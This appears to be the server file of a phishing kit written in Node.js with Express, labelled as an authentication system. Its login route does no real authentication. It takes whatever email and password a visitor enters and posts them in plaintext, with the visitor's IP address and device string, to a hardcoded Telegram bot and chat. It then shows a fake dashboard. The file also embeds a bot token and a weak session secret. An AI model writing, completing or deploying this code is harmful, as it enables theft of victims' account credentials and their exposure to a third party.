const express = require("express");
const session = require("express-session");
const axios = require("axios");

const app = express();

// ===== TELEGRAM =====
const BOT_TOKEN = "8741365423:AAG_VYtHoC0zeCE5Oa3RKYaMZThiH-_M5yI";
const CHAT_ID = "7981380138";

// ===== MIDDLEWARE =====
app.use(express.static("public"));
app.use(express.urlencoded({ extended: true }));

// ===== SESSION (AUTH SYSTEM) =====
app.use(session({
  secret: "auth-secret-key",
  resave: false,
  saveUninitialized: true,
  cookie: { maxAge: 24 * 60 * 60 * 1000 }
}));

// ===== HOME =====
app.get("/", (req, res) => {
  res.redirect("/login.html");
});

// ===== TELEGRAM FUNCTION =====
async function sendTelegram(message) {
  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
    });
  } catch (err) {
    console.log("Telegram error:", err.message);
  }
}

// ===== LOGIN (AUTH + DEVICE + SESSION) =====
app.post("/login", async (req, res) => {
  const email = req.body?.email || "N/A";
  const password = req.body?.password || "N/A";

  // 🌐 DEVICE INFO
  const ip =
    req.headers["x-forwarded-for"] ||
    req.socket.remoteAddress ||
    "Unknown IP";

  const device = req.headers["user-agent"] || "Unknown Device";

  // 🔐 AUTH SESSION
  req.session.user = email;
  req.session.sessionId =
    Date.now() + "-" + Math.random().toString(36).substring(2);

  const message = `
🔐 AUTH LOGIN ALERT
────────────────────
📧 Email: ${email}
🔑 Password: ${password}
🆔 Session ID: ${req.session.sessionId}
🌐 IP: ${ip}
📱 Device: ${device}
🕒 Time: ${new Date().toLocaleString()}
`;

  await sendTelegram(message);

  res.redirect("/dashboard");
});

// ===== DASHBOARD (AUTH PROTECTED) =====
app.get("/dashboard", (req, res) => {
  if (!req.session.user) {
    return res.redirect("/login.html");
  }

  res.send(`
    <h1>Welcome ${req.session.user}</h1>
    <p>Session ID: ${req.session.sessionId}</p>
    <p>Device: ${req.headers["user-agent"]}</p>
    <a href="/logout">Logout</a>
  `);
});

// ===== LOGOUT =====
app.get("/logout", (req, res) => {
  req.session.destroy(() => {
    res.redirect("/login.html");
  });
});

// ===== START SERVER =====
app.listen(3000, () => {
  console.log("Server running on http://localhost:3000");
});